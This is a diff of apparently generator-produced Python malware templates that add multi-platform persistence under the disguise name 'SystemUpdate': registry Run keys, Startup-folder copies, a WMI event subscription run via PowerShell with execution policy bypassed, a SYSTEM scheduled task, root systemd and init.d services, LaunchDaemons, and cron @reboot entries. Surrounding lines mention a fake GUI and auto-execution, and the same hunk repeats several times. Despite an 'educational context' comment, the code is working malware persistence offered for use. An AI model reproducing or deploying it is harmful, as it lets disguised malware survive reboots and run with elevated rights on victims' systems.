+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1555,6 +2094,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1568,60 +2108,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1664,6 +2378,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1677,60 +2392,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1776,6 +2665,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1789,60 +2679,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
